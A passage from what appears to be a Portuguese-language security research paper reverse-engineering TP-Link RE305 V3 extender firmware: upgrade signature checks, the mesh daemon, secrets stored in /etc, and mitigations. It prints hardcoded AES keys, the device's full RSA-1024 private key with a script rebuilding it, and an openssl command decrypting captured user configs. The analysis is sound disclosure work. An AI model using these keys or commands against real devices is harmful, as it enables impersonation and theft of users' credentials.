**Passo 4 — install via** `nvrammanager`**.** O OpenWrt 12.09 ships com `sysupgrade` mas a TP-Link **não usa ele**. Pude confirmar:

```bash
# No device (shell root via UART):
root@OpenWrt:/# type platform_check_image
-sh: platform_check_image: not found

root@OpenWrt:/# grep -rln platform_check_image /lib/upgrade/
/lib/upgrade/common.sh

# A única referência em common.sh é estrutural, não define a função:
root@OpenWrt:/# grep -n "platform_check_image" /lib/upgrade/common.sh
122:sysupgrade_image_check="platform_check_image"
170:type platform_check_image >/dev/null 2>/dev/null || {

# Sysupgrade vai falhar com:
root@OpenWrt:/# /sbin/sysupgrade --test some-image.bin
Firmware upgrade is not implemented for this platform.
```

`platform_check_image` é o ponto de hook que platform-specific .sh scripts (`tp-link.sh`, `ralink.sh`, etc.) deviam definir pra validar o image antes do flash. **Não existe no FS dumpado**. O sysupgrade `/sbin/sysupgrade`, se invocado, sai com `Firmware upgrade is not implemented for this platform.` — código morto.

O instalador real é `/usr/bin/nvrammanager`, daemon proprietário 174 KiB. Funções relevantes (binário stripped, strings extraction):

```bash
$ strings /usr/bin/nvrammanager | grep -E '^[a-z][a-zA-Z_0-9]+$' | grep -iE "(rsa|sha|md5|verify|flash|mtd|sysmgr|check|partition|fw)" | sort -u
CheckUpgradeFile
md5_make_digest
md5_verify_digest
MD5_Final
MD5_Init
MD5_Update
mtd_erase
mtd_get_secotor_size
mtd_read
mtd_write
nm_api_readPtnFromNvram
nm_api_writePtnToNvram
nm_initFwupPtnStruct
nm_lib_makeArgs
nm_lib_parsePtnIndexFile
nm_lib_ptnNameToEntry
nm_lib_readHeadlessPtnFromNvram
nm_lib_readPtnFromNvram
nm_lib_readPtnUsedSize
nm_lib_writeHeadlessPtnToNvram
nm_lib_writePtnToNvram
nvram_flash_read_tp_partition
nvram_flash_read2
nvram_flash_write_tp_partition
nvram_flash_write2
rsaVerifySignByBase64EncodePublicKeyBlob
RSA_SHA_Simple
sysmgr_cfg_checkSupportList
sysmgr_cfg_getProductInfoFromNvram
```

Error strings do verifier:

```bash
$ strings /usr/bin/nvrammanager | grep -E '\[Error\]'
[Error]%s():%5d @ Maximum number is invalid. maxNum = %d
[Error]%s():%5d @ Invalid file.
[Error]%s():%5d @ md5 verify error
[Error]%s():%5d @ uncompress error.
[Error]%s():%5d @ malloc fail
[Error]%s():%5d @ read from flash failed

$ strings /usr/bin/nvrammanager | grep -iE "(verify error|verify ok|check)"
Verify error!
CheckUpgradeFile
sysmgr_cfg_checkSupportList
```

Help do binário:

```bash
$ /usr/bin/nvrammanager --help
nvrammanager: NVRAM partition manager
Usage: nvrammanager [OPTIONS] ARGS
Operations:
  -c, --check=FILE                 Check upgrade FILE
  -r, --read                       Read partition
  -w, --write                      Write partition
  -e, --erase                      Erase partition
  -p, --partition=PTN_NAME         Partition name. ...
```

`nvrammanager -c FILE` faz a verificação completa antes de gravar:

1.  Carrega a chave pública RSA embedded no binário (149 bytes, formato proprietário-TP-Link com magic `RSA1` separado em região distinta de `.rodata`)
    
2.  Decompõe o image em partições (com `nm_lib_parsePtnIndexFile`)
    
3.  Para cada partição, calcula MD5 dos dados (`md5_make_digest`) e compara com hash do header (`md5_verify_digest`)
    
4.  Valida assinatura RSA do header com a pubkey embedded (`rsaVerifySignByBase64EncodePublicKeyBlob`)
    
5.  Checa lista de suporte (`sysmgr_cfg_checkSupportList`) — image precisa declarar suporte ao hwId/fwId atual
    
6.  Só então chama `nvram_flash_write_tp_partition` → `mtd_write`
    

Sequência defensável. Comparando com o ZTE F689, a TP-Link efetivamente faz mais validação aqui — o RE305 tem RSA signature gate antes do flash write, o F689 da Claro depende do ACS pra empurrar firmware via TR-069 Download RPC sem verificação de signature local equivalente.

Três pontos onde o gate dá pra arranhar. **Hashes legados em vez de SHA-256.** A função `RSA_SHA_Simple` sugere uso de SHA-1 (não SHA-256) no RSA-PKCS1-v1\_5 signature, e o hash do conteúdo é MD5. SHA-1 e MD5 estão broken pra collision attack. Atacante com a chave privada da TP-Link (improvável) ou com colisão útil (factível em SHA-1 mas requer payload grande) consegue forjar image. Não é exploit prático sem a chave, mas é fraqueza de design.

**Formato custom da RSA pubkey.** O blob de 149 bytes não é PEM nem MS PUBLICKEYBLOB padrão. O magic `RSA1` aparece em `.rodata` numa região separada, indicando que `rsaVerifySignByBase64EncodePublicKeyBlob` é implementação proprietária TP-Link (não OpenSSL `RSA_verify`). Crypto custom historicamente vem com padding oracle, length confusion, time-side-channel. Sem decifrar o algoritmo interno fica como suspeita de design, mas é exatamente o tipo de surface onde bugs aparecem.

`crytool` **com KEY+IV hardcoded no help.** Strings em `nvrammanager` mostram o exemplo de invocação:

```bash
$ strings /usr/bin/nvrammanager | grep -A1 -B1 crytool
  -p, --partition=PTN_NAME         Partition name. ...
/usr/bin/crytool -r /tmp/user_conf.info -p user-config-info -m 478DA50BF9E3D2CF8819839D4C061445 -d 478DA50BF9E3D2CF
/tmp/user_conf.info
```

*   `m 478DA50BF9E3D2CF8819839D4C061445` (16 bytes = AES-128 KEY) e `d 478DA50BF9E3D2CF` (8 bytes = IV ou DES key). O binário `crytool` em si não está no FS dumpado — pode ser gerado runtime ou esteja em partição não capturada. Mas as constantes estão embedded em `nvrammanager` como literais, então existem no firmware. Parecem ser KEY/IV default pra decriptar `/tmp/user_conf.info` (config exportado por usuário) — outro caminho de leak se um atacante captura o config.bin do usuário.
    

Demo de decrypt em um config.bin capturado (assumindo formato AES-128-CBC com esses defaults):

```bash
# Se você tem um config.bin exportado pelo Web UI:
$ openssl enc -aes-128-cbc -d -K 478DA50BF9E3D2CF8819839D4C061445 \
    -iv 478DA50BF9E3D2CF -in config.bin -out config.plain
# Se o output for plaintext XML/UCI, a chave é literal e cross-device.
```

Fechando a cadeia: o canal cloud em si autentica via TLS — com a CA closed-trust da seção 13 sendo a vulnerabilidade real do transporte. Mas o passo final de instalação tem verificação RSA+MD5 que requer chave privada TP-Link válida pra forge. **O vetor de RCE-via-cloud é credível mas não trivial** — depende ou de compromise da chave de signing da TP-Link, ou de furo na custom crypto implementation. Sem uma dessas duas, o gate de RSA segura.

* * *

## 14\. TMP — TP-Link Mesh Protocol daemon

Subindo na lista por tamanho de binário, depois do `dropbear` e do `openssl` o próximo daemon proprietário é o `tmpServer` em `/usr/bin/`, **275 KiB**. Maior que o `tdpServer` (160 KiB) que paper já cobre na seção 12.6. E não tem CVE público nem documentação aberta sobre o protocolo que esse daemon implementa.

Init:

```bash
# /etc/init.d/tmpServer
start() {
    /bin/nice -n -5 /usr/bin/tmpServer &
    /bin/nice -n -5 /usr/bin/tdpServer &
    /bin/nice -n -5 /usr/bin/pfclient &
}
```

Os três daemons subindo juntos com nice -5 (prioridade elevada). Trio coordenado: tmpServer (mesh control), tdpServer (discovery — paper seção 12.6), pfclient (path forwarding client, surface ainda não decifrada).

Strings do `tmpServer` revelam o protocolo. Extração:

```bash
$ strings /usr/bin/tmpServer | grep -E "^TMP |bindOwner|isBinded|hostSupport"
TMP RECV HELLO PKT
TMP RECV DATA PKT
TMP RECV BYE PKT
TMP RECV ASSOC PKT and CLOSE SOCK
TMP RECV DATA length = %d
TMP RECV ERROR
tpApp_inf_BindOwner
tpApp_inf_unBindOwner
bindOwner
isBinded
hostSupportOneMesh: %d

$ strings /usr/bin/tmpServer | grep -E "pAppRecvHdr|servicetype"
pAppRecvHdr->servicetype = 0x%x
```

Esse é o **TP-Link Mesh Protocol** (TMP, prefixo padronizado dos logs). É o protocolo que o RE305, sendo extender, usa pra falar com um router TP-Link “owner” — o gateway principal da mesh OneMesh. Pacotes HELLO/DATA/BYE/ASSOC, framing custom, header de serviço com tipo. `bindOwner` / `unBindOwner` são as primitivas que ligam o extender ao router. `isBinded` flag de estado.

Onde o `tmpServer` escuta. Decompilando com radare:

```bash
$ r2 -2 -q -e scr.color=0 -c 'aaa; afl' /usr/bin/tmpServer | grep -iE "(bind|listen|socket|server)"
0x004290fc    6 224          sym.unBindOwner
0x00428ffc    6 256          sym.bindOwner
0x004308e0    1 16           sym.imp.listen
0x004307f0    1 16           sym.imp.socket
0x00430190    1 16           sym.imp.bind

$ r2 -2 -q -e scr.color=0 -c 'aaa; axt @ sym.imp.bind' /usr/bin/tmpServer
(nofunc) 0x4025e8 [UNKNOWN] invalid
fcn.0040fb88 0x40fc28 [CALL] jalr t9

$ r2 -2 -q -e scr.color=0 -c 'aaa; s fcn.0040fb88; pdf' /usr/bin/tmpServer | head -50
```

A função `fcn.0040fb88` (chamada por `fcn.00411398`) faz o setup:

```plaintext
0x0040fbb0  addiu a0, zero, 2          ; socket: AF_INET
0x0040fbb4  addiu a1, zero, 2          ; type field
0x0040fbbc  addiu a2, zero, 6          ; protocol field — combina pra TCP no caminho efetivo
0x0040fbb8  jalr t9                    ; socket(...)
...
0x0040fc04  sh v0, (var_24h)           ; sin_family = AF_INET=2
0x0040fc08  addiu v0, zero, 0x224e     ; port immediate
0x0040fc10  sh v0, (var_26h)           ; sin_port (network byte order, LE arch)
0x0040fc14  lui v0, 0x100
0x0040fc18  addiu v0, v0, 0x7f         ; v0 = 0x0100007f
0x0040fc20  sw v0, (var_28h)           ; sin_addr.s_addr = 0x0100007f
```

Em little-endian MIPS, `sin_port = 0x224e` armazenado significa bytes `0x4e 0x22` na ordem de rede, que é a porta `0x4e22 = 20002`. E `sin_addr.s_addr = 0x0100007f` armazenado significa bytes `0x7f 0x00 0x00 0x01`, que é `127.0.0.1`.

Ou seja: `tmpServer` **escuta em 127.0.0.1:20002 TCP**, loopback only, não exposto à LAN. Isso muda a leitura. O `tmpServer` é um daemon de IPC interno do device, não um endpoint de wire protocol acessível por outro host.

O caminho real de LAN exposure pra TMP é via `tdpServer`, que sim escuta em `0.0.0.0:20002 UDP` (mesma porta, protocolo diferente, paper já cobre na seção 12.6). O `tdpServer` faz parsing de OneMesh discovery e bind, e provavelmente serializa state pro `tmpServer` via TCP loopback. Esse é o vetor LAN-reachable, e ele tem o problema documentado da F20 revisada (AES-256 com chave global hardcoded `TPONEMESH_Kf!xn?gj6pMAt-wBNV_TDP` no slave-key exchange).

O que sobra como surface pra TMP especificamente:

*   `tmpServer` é privesc-local-only — qualquer processo na CPE com socket() pode falar com ele em 127.0.0.1:20002. Não é per-user porque o device só tem root, mas se algum daemon não-root for adicionado em firmware futuro (improvável mas possível), ganha acesso direto ao bind/unbind do extender
    
*   A coordenação `tdpServer` (UDP LAN) → `tmpServer` (TCP loopback) é o caminho de relay. Vulnerabilidade no parser do `tdpServer` (memory corruption, lógica) que cause estado inconsistente vira controle sobre o `tmpServer` indirectly
    
*   O wire format TMP ainda precisa ser caracterizado (`HELLO`/`DATA`/`BYE`/`ASSOC`, header `pAppRecvHdr->servicetype` em 4 bytes, payload variável)
    

Pra fechar o que sei do TMP nesse passe estático: o daemon roda como root com prioridade elevada, ouve em **127.0.0.1:20002 TCP** (loopback), aceita HELLO/DATA/BYE/ASSOC nessa surface e expõe `bindOwner`/`unBindOwner` via esses mesmos pacotes. Vive coordenado com `tdpServer` (discovery LAN UDP) e `pfclient` (path forwarding). O caminho de ataque LAN-direto não passa por ele — passa pelo `tdpServer`, que é o front-end exposto. O `tmpServer` é alvo válido só pra atacante que já tem código rodando na CPE.

* * *

## 15\. Material criptográfico em cleartext em /etc

Filesystem montado, peguei o reflexo de qualquer pentest pós-acesso: `grep` por chaves, senhas, certs, magic strings. O resultado em `/etc/config/accountmgnt`, arquivo lido pelo daemon de account management:

```plaintext
config rsa 'keys'
    option e '010001'
    option d '091550E28B45A770B296EDAEEF04E687F3258AB765A22E7CEA9D1BC8EB10BD2A0601A4421D267FD5ED5BF25A7372B67FFAD6D41A81A194B67623617F0A86A28F3727A6EC0E34ACCA4823F486CB3E08D9BBC2D043D62CC943EF898EF7C74CDCD8E9CEA87006019D6464B7B2BA37043D911611580A7A87D862E6BEBE4AD96146B1'
    option n 'D1E79FF135D14E342D76185C23024E6DEAD4D6EC2C317A526C811E83538EA4E5ED8E1B0EEE5CE26E3C1B6A5F1FE11FA804F28B7E8821CA90AFA5B2F300DF99FDA27C9D2131E031EA11463C47944C05005EF4C1CE932D7F4A87C7563581D9F27F0C305023FCE94997EC7D790696E784357ED803A610EBB71B12A8BE5936429BFD'

config cloud_account 'cloud_admin'

config account 'admin'
    option password 'U2FsdGVkX18aiTdFbz/nDvpHPyWANba5HAL1ev7/3v0='
    option username 'admin'
```

Duas coisas a destacar.

**Primeiro: a chave privada RSA-1024 está em cleartext no** `/etc/config/accountmgnt`**.** Expoente público `e=010001` (`65537`, padrão), expoente privado `d` (256 hex chars = 1024 bits), módulo `n` (256 hex chars = 1024 bits). Isso é a chave privada completa, sem encryption, sem ACL no arquivo (`644` por padrão no OpenWrt config).

Reconstrução da chave em formato PEM utilizável (e teste de validade):

```bash
$ python3 << 'PY'
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateNumbers, RSAPublicNumbers
from cryptography.hazmat.primitives.serialization import Encoding, PrivateFormat, NoEncryption

n = int("D1E79FF135D14E342D76185C23024E6DEAD4D6EC2C317A526C811E83538EA4E5ED8E1B0EEE5CE26E3C1B6A5F1FE11FA804F28B7E8821CA90AFA5B2F300DF99FDA27C9D2131E031EA11463C47944C05005EF4C1CE932D7F4A87C7563581D9F27F0C305023FCE94997EC7D790696E784357ED803A610EBB71B12A8BE5936429BFD", 16)
e = int("010001", 16)
d = int("091550E28B45A770B296EDAEEF04E687F3258AB765A22E7CEA9D1BC8EB10BD2A0601A4421D267FD5ED5BF25A7372B67FFAD6D41A81A194B67623617F0A86A28F3727A6EC0E34ACCA4823F486CB3E08D9BBC2D043D62CC943EF898EF7C74CDCD8E9CEA87006019D6464B7B2BA37043D911611580A7A87D862E6BEBE4AD96146B1", 16)

# Recupera p,q a partir de (n,e,d) via algoritmo de Miller (1975) — polinomial probabilístico.
# Posse de (n,e,d) já é equivalente à private key; CRT params abaixo são pra serializar PEM canônico.
import math
k_de_minus_1 = e * d - 1
t = k_de_minus_1
while t % 2 == 0:
    t //= 2
# Pollard rho-like: any g satisfies g^t ≡ 1 mod n usually
for g in range(2, 100):
    x = pow(g, t, n)
    while x != 1 and x != n - 1 and pow(x, 2, n) != 1:
        x = pow(x, 2, n)
    if x != n - 1 and pow(x, 2, n) == 1:
        p = math.gcd(x - 1, n)
        q = n // p
        if p * q == n:
            break

pubnum = RSAPublicNumbers(e, n)
dp = d % (p - 1)
dq = d % (q - 1)
iqmp = pow(q, -1, p)
privnum = RSAPrivateNumbers(p, q, d, dp, dq, iqmp, pubnum)
key = privnum.private_key()
pem = key.private_bytes(Encoding.PEM, PrivateFormat.PKCS8, NoEncryption())
print(pem.decode())
PY

n bit length: 1024
p bit length: 512
q bit length: 512
-----BEGIN PRIVATE KEY-----
MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBANHnn/E10U40LXYY
XCMCTm3q1NbsLDF6UmyBHoNTjqTl7Y4bDu5c4m48G2pfH+EfqATyi36IIcqQr6Wy
8wDfmf2ifJ0hMeAx6hFGPEeUTAUAXvTBzpMtf0qHx1Y1gdnyfwwwUCP86UmX7H15
BpbnhDV+2AOmEOu3GxKovlk2Qpv9AgMBAAECgYAJFVDii0WncLKW7a7vBOaH8yWK
t2WiLnzqnRvI6xC9KgYBpEIdJn/V7VvyWnNytn/61tQagaGUtnYjYX8KhqKPNyem
7A40rMpII/SGyz4I2bvC0EPWLMlD74mO98dM3NjpzqhwBgGdZGS3sro3BD2RFhFY
CnqH2GLmvr5K2WFGsQJBAN2nzluj0VrfYN77C2VGy9mEB8u5jkULdlwm5PjWpfkr
PFxML4d5MHLTq79QQygJx1NtttxNcwm0bS/O1s7qrc8CQQDybbb3pGDk2039ZonV
wscS8ObSGMVNmmX4lKlxiqYPMUU3G4sqjFDuBgkFAOlfBPZTosxDNnGNvWHNsZ9R
qvhzAkEA0nNQ6pFPZQhR4WRaHX5qbct922ACRGvtpPEI1Xp3e2whk0CCoA3ggiWX
G74JBSrDpeK1i9W9M6mrQYkRSsRm4QJAHSB1dTd4tMZsjl99fANU67+p2+BCBFri
mYUy/oNMBFNFH6PdipUlPBPZjZJYd6Qe/Fl49TJbXk48q/wFSkiiZQJBAKu2QGE1
ZRAh+x6Bv5K0KRseHzlAcQuLnMGDXioG2Dlc76WQ4sBE7JvsG6gyVlmHdEj0LGzM
ndxeIaQT+jrZLpw=
-----END PRIVATE KEY-----
```

Validação que a chave é funcional:

```bash
$ echo "$PEM" > /tmp/re305.rsa.pem
$ echo "hello onemesh" | openssl pkeyutl -sign -inkey /tmp/re305.rsa.pem -rawin > sig.bin
$ openssl pkey -in /tmp/re305.rsa.pem -pubout -out /tmp/re305.rsa.pub
$ echo "hello onemesh" | openssl pkeyutl -verify -pubin -inkey /tmp/re305.rsa.pub -rawin -sigfile sig.bin
Signature Verified Successfully
```

Funcional. A chave privada RSA-1024 do RE305 V3 com firmware 200826 está agora disponível pra quem tiver o config dump. Não preciso decifrar a senha admin pra usar essa chave — só de tê-la em mãos já me dá capacidade de assinar como o device, pra qualquer protocolo TP-Link que use essa key como identidade RSA (e há vários candidatos: setup wizard, bind handshake, OneMesh master verify).

A chave foi gerada — em algum momento — pelo script `/etc/init.d/luarsa_keys_gen`. No build que dumpei, esse script está com todas as linhas comentadas, então a chave atual veio do firmware de fábrica e é compartilhada entre todas as unidades da mesma versão de firmware. Cross-device static key. Padrão clássico de fail: vendor gera uma vez, embute no firmware, deploya em milhões de unidades.

Pra que essa chave é usada? Strings em `nvrammanager`, `cloud-client` e `tmpServer` indicam que tem componente RSA local em handshakes proprietários e em decryption de blobs do `nvrammanager`. Sem decifrar essa parte ainda, mas a presença literal da chave privada já é finding suficiente: **se a chave é usada em qualquer protocolo de bind/auth/decryption, todo atacante com firmware da TP-Link tem ela**.

RSA-1024, escolha conservadora de 2010, hoje desencorajada pelo NIST. Combinada com chave estática cross-device, o cenário é o pior dos dois mundos: o algoritmo é mais fraco do que se espera em 2026, e ainda é a mesma chave em todas as unidades.

**Segundo: o módulo** `luci.model.crypto` **carrega duas chaves AES-256-CBC literais em bytecode pré-compilado.**

`grep`\-ando o `/usr/lib/lua/luci/model/crypto.lua` (que está em Lua 5.1 bytecode, header `LuaQ`) os strings table tem dois hex literals significativos:

```plaintext
KEY: 2EB38F7EC41D4B8E1422805BCD5F740BC3B95BE163E39D67579EB344427F7836
IV:  360028C9064242F81074F4C127D299F6
```

KEY = 32 bytes = AES-256, IV = 16 bytes = bloco AES. Adjacentes no constant pool aos strings `-K` e `-iv` (note o `-K` maiúsculo — modo direto KEY+IV explícito, sem KDF, sem salt) e às functions exportadas `enc_for_onemesh` / `dec_for_onemesh`.

Existe um pipeline OneMesh que usa essa chave + IV literais com `openssl enc -aes-256-cbc -K <KEY> -iv <IV>`. Sem rotação, sem KDF, sem per-device randomization. **A mesma chave AES roda em todas as unidades RE305 V3 com firmware 200826 e provavelmente em toda a linha OneMesh da TP-Link que compartilha esse bytecode.**

Cruzando com o que já tinha mapeado do TMP na seção 14: qualquer tráfego cifrado pelo TMP daemon entre o RE305 e o router OneMesh “owner” usa essa chave, e atacante com o firmware decifra qualquer pacote capturado da mesma classe de devices. Pior: o IV é FIXO. Em CBC, IV fixo + key fixa significa que padrões de plaintext repetido aparecem como ciphertext idêntico, e qualquer chosen-plaintext (ou known-plaintext, se atacante conhece o handshake do OneMesh) extrai informação. O cenário do OneMesh broadcast em LAN doméstica significa que vizinhos com o mesmo modelo, ou um atacante na LAN, podem injetar e forjar mensagens — bind hijacking via TMP fica trivial.

Não é CVE-class porque o impacto direto pede conhecimento do protocolo TMP de wire format (a fazer no apêndice deste paper ou em paper de continuidade). Mas como achado de design é tão grave quanto qualquer outro.

**Terceiro: a senha do** `admin` **está encriptada com o formato** `Salted__` **do OpenSSL.**

```plaintext
U2FsdGVkX18aiTdFbz/nDvpHPyWANba5HAL1ev7/3v0=
```

`U2FsdGVkX1` é o base64 de `Salted__`. Esse é o sentinel do `openssl enc -aes-...-cbc` quando rodado com password-based KDF padrão. Decodando o base64:

```plaintext
00000000  53 61 6c 74 65 64 5f 5f  1a 89 37 45 6f 3f e7 0e   Salted__..7Eo?..
00000010  fa 47 3f 25 80 35 b6 b9  1c 02 f5 7a fe ff de fd   .G?%.5.....z....
```

Header `Salted__` (8 bytes) + salt (8 bytes: `1a 89 37 45 6f 3f e7 0e`) + ciphertext (16 bytes = 1 bloco AES). Senha em texto plano cabe em até 16 bytes (provavelmente curta, tipo o default “admin” ou um valor configurado pelo usuário).

Diferente do path OneMesh (que usa `-K -iv` direto com as chaves hardcoded), esse fluxo é declarado em `crypto.lua` como `openssl enc -aes-256-cbc -k <password>` com password-based KDF, e o `password` viria de `/etc/secretkey`:

```plaintext
$ strings /usr/lib/lua/luci/model/crypto.lua | grep -A1 -B1 secretkey
-k %q
-kfile /etc/secretkey
2EB38F7EC41D4B8E1422805BCD5F740BC3B95BE163E39D67579EB344427F7836
```

Só que verifiquei no device live: `/etc/secretkey` **não existe**. Não é gerado pelos init scripts catalogados, não está em `/tmp`, não está em `/etc_ro`, não fica em memory mapped persistent storage que pude inspecionar. Nenhum daemon write para esse path.

A leitura inicial foi que o caminho `crypt_used_openssl → enc_file/dec_file` declarado em `crypto.lua` seria fallback morto e o caminho real seria `wolfssl_enc_dec`. Pra validar essa hipótese, peguei o próprio `/usr/bin/lua` patched do device, copiei junto da `liblua.so.5.1.5` e da árvore Lua pro `usr/lib/lua/` num chroot fake, e rodei via `qemu-mipsel-static` no host x86\_64:

```bash
$ mkdir -p /tmp/re305_qemu/{lib,usr/lib,usr/bin,usr/lib/lua}
$ cp /usr/bin/lua /tmp/re305_qemu/usr/bin/
$ cp /usr/lib/liblua.so.5.1.5 /tmp/re305_qemu/usr/lib/
$ ln -s liblua.so.5.1.5 /tmp/re305_qemu/usr/lib/liblua.so.5.1
$ cp -r /lib/* /tmp/re305_qemu/lib/   # uClibc + deps
$ tar -C /usr/lib/lua -c . | tar -C /tmp/re305_qemu/usr/lib/lua -x

$ qemu-mipsel-static -L /tmp/re305_qemu /tmp/re305_qemu/usr/bin/lua -v
Lua 5.1.5  Copyright (C) 1994-2012 Lua.org, PUC-Rio (double int32)
```

A string `(double int32)` no banner do interpreter é a **assinatura da TP-Link** — vanilla Lua 5.1 não imprime isso. Confirma a modificação custom do interpreter e o motivo do `luadec`/`unluac` falharem com `bad header` no bytecode shipped.

Com o interpreter rodando, escrevi um bootstrap que hooka `io.popen`, `os.execute` e `io.open` ANTES de carregar `luci.model.crypto`, e chama `crypto.enc("test_plaintext")`:

```lua
-- /tmp/re305_qemu/hook.lua
local orig_popen = io.popen
io.popen = function(cmd, ...)
    print("[HOOK io.popen]: " .. tostring(cmd))
    return orig_popen(cmd, ...)
end
local orig_open = io.open
io.open = function(path, mode, ...)
    print("[HOOK io.open]: " .. tostring(path) .. " mode=" .. tostring(mode))
    return orig_open(path, mode, ...)
end
local crypto = require("luci.model.crypto")
print("=== crypto.enc trial ===")
local ok, result = pcall(crypto.enc, "test_plaintext_padme")
print("ok=", ok, "result=", tostring(result):sub(1, 200))
```

Execução:

```plaintext
$ qemu-mipsel-static -L /tmp/re305_qemu /tmp/re305_qemu/usr/bin/lua /tmp/re305_qemu/hook.lua

Can't open "/etc/secretkey" for reading, No such file or directory
40F7F1DC73790000:error:80000002:system library:BIO_new_file:No such file or directory:
    ../crypto/bio/bss_file.c:67:calling fopen(/etc/secretkey, r)
40F7F1DC73790000:error:10000080:BIO routines:BIO_new_file:no such file:
    ../crypto/bio/bss_file.c:75:
aes-256-cbc: Use -help for summary.
Invalid command 'zlib'; type "help" for a list.
=== crypto.enc trial ===
ok= true result= function: 0x462e50
```

Dois achados concretos:

1.  **O caminho REAL usado em produção É** `crypt_used_openssl` **— não** `wolfssl_enc_dec`**.** Minha leitura inicial estava errada. O Lua module efetivamente dispara `openssl zlib -e | openssl aes-256-cbc -e -kfile /etc/secretkey` via `io.popen`. O fallback `wolfssl_enc_dec` só rola se o probe inicial decidir que `crypt_used_openssl` é false.
    
2.  **O caminho FALHA em runtime** porque `/etc/secretkey` não existe E o `openssl` instalado também rejeita o subcomando `zlib` (removido nas versões recentes por motivos de CVE histórica).
    

O que aconteceu aqui, na minha leitura: o config field `accountmgnt.admin.password` (o `U2FsdGVkX1...`) foi muito provavelmente gravado num build/factory anterior onde `/etc/secretkey` existia e `openssl zlib` estava disponível, e nunca foi reencriptado depois que esses pré-requisitos foram removidos. Na prática o ciphertext continua no UCI, mas o caminho declarado pra decifrar dele não funciona no runtime atual.

Sobra inconsistência arquitetural entre o que `crypto.lua` declara e o que o runtime efetivamente sustenta. Ou (a) o admin auth da web UI usa um caminho alternativo que ignora `accountmgnt.admin.password` completamente, ou (b) o admin auth está broken numa sub-classe de devices que receberam esse firmware sem rebuild do `/etc/secretkey`. Não consegui distinguir esses dois cenários do meu lado estático+emulado.

Pra fechar a história sem live device introspection, três caminhos ficam abertos: cross-check com firmware OEM de outro modelo TP-Link da mesma família que ainda gere `/etc/secretkey` no boot (se existir) identificaria o script ou daemon ausente; decompilação do `wolfssl_enc_dec` body via patched luadec está bloqueada pelo bytecode com modificações custom de header e opcode constant types; e RE do binário `/usr/bin/lua` (16 KiB, MIPS LE stripped) pra extrair a tabela de opcodes modificada é vetor mais técnico mas viável. Pra esse paper estático fica arquitetura documentada com clear-text recovery pendente.

Qualquer um com shell root no RE305 pode dumpar a chave runtime — interceptando uma chamada a `aes_decrypt` em qualquer Lua script, ou via gdb attach no processo uhttpd. Como `dropbear` aceita root sem senha no factory state (seção 10), o atacante remoto LAN tem rota completa pra essa recuperação sem precisar quebrar crypto.

Bate com o que vi no ZTE F689: lá o PKCS12 client cert tinha senha derivada como `sha256(seed)[:16]`, onde `seed` é literal `MgtServer.0.PKCS12PassWord` do hardcode. Mesma arquitetura aqui — secret hardcoded → KDF → key → decrypt config field. Vendors diferentes, mesma classe de falha, ambos confiando que reverse do binário cliente seja barreira efetiva. Não é.

Pra completar o `/etc`: `/etc/certificate/2048_newroot.cer` é a CA da TP-Link discutida na seção 13, com 50 anos de validade; `/etc/dropbear/` mora em ramfs (o `/etc` inteiro é regenerado a cada boot, F23 da enumeração na seção 12.9), então as host keys de SSH são geradas runtime e não shipped; `/etc/config/system` e `/etc/config/wireless` são defaults editáveis via UCI, sem material crypto.

Nenhum CVE público documentando especificamente `accountmgnt` da TP-Link com RSA-1024 em cleartext + admin password em formato OpenSSL `Salted__` no RE305 V3. Família “embedded device with cleartext RSA in config” tem CVEs em outros vendors, nenhum apontando esse arquivo específico.

* * *

## 16\. Impacto de segurança consolidado

A interface UART exposta no RE305 viola múltiplos princípios de defesa em profundidade ao mesmo tempo. Cada camada que normalmente faria parte do modelo de ameaça do device ou foi desabilitada, ou é silently ignored, ou está protegida por crypto quebrada desde os anos 90.

| Camada | Estado | Impacto |
| --- | --- | --- |
| Pads UART | Não vazados mas funcionais | Atrasa atacante casual |
| U-Boot CLI | Sem senha, `md`/`mw`/`spi`/`tftpboot` habilitados | Dump completo, modificação de RAM, escrita arbitrária em flash |
| U-Boot env | `bootcmd=tftp`, `serverip` hardcoded `192.168.0.184` | TFTP boot attack com físico curto |
| Menu boot | Opções 5/6/8 escondidas | Superfície adicional de TFTP boot |
| Boot delay | 1 s, suficiente pra interrupção manual | Janela aberta pra atacante físico |
| Kernel cmdline | `earlyprintk debug` em produção | Info leak by design via UART |
| Filesystem em flash | Encrypted-at-rest (hipótese HW engine MT7628) | Hardening contra chip-off, irrelevante pós-boot |
| Console serial pós-boot | Shell root sem senha | Root direto via UART em 30s |
| `/etc/shadow` | root sem hash | Login serial e SSH ambos vulneráveis |
| dropbear `SysAccountLogin` | Silently ignored no binário | Tentativa de hardening não-funcional |
| dropbear versão | 2011.54 (9 anos legacy) | Múltiplos CVEs pre/post-auth |
| TDDP | 0.0.0.0:1040 UDP, ops destrutivas, single DES | Provável CVE-2020-12109, erase\_radio via UDP |
| `path_selection` | 0.0.0.0:6000/6001 TCP, handle\_update\_config\_event | Candidato a pre-auth RCE |
| `tdpServer` | 0.0.0.0:20002 UDP OneMesh, single DES | Mesh MITM com brute-force 24h |
| `uhttpd` | TLS not compiled, :80 plaintext only | Sniffing trivial em LAN/WiFi |
| `rfc1918_filter` | Desabilitado no build BR | DNS rebinding via browser do usuário |
| SSH host keys | Regen a cada boot em ramfs | Treina usuário a ignorar MITM warning |

Pré-runtime extraction é a fase mais perigosa porque autenticação no Linux, ACLs, firewall, TLS ainda não estão ativas. Mas neste device, mesmo após o boot completar, o estado runtime continua trivialmente comprometível.

O que o acesso UART habilita, em ordem de gravidade. Recuperação de senha admin default (em unit pós-reset, factory state, unboxing), vetor de “vizinho consegue acesso ao seu extender”. Localização de chaves TLS e RSA embarcadas pra impersonation de gerência (TR-069/CWMP, cloud TP-Link, provisionamento OneMesh). Identificação dos daemons proprietários (tddp, tdpServer, path\_selection, pfclient, client\_mgmt) pra auditoria de superfície remota, vetor primário de CVE explorável sem físico contra qualquer RE305 na mesma LAN ou WiFi. E modificação de firmware (rebuild do SquashFS a partir do firmware update file público, recálculo de checksums, reflash via TFTP ou `spi write`), persistência em flash trivial.

### 16.1 Mitigações realistas

Mitigações que não dependem de fuse ou secure boot, ou seja, que custam zero em BOM:

1.  Senha no U-Boot CLI (`CONFIG_AUTOBOOT_KEYED` ou `CONFIG_AUTOBOOT_STOP_STR` com hash).
    
2.  Senha no Linux root, getty validando sem fallback, fix trivial no `/etc/shadow` gerado em build.
    
3.  Compilar dropbear honrando `SysAccountLogin`, ou remover a diretiva da config se não tem efeito. Config que mente é pior que config ausente.
    
4.  Compilar uhttpd com TLS, habilitar HTTPS por default.
    
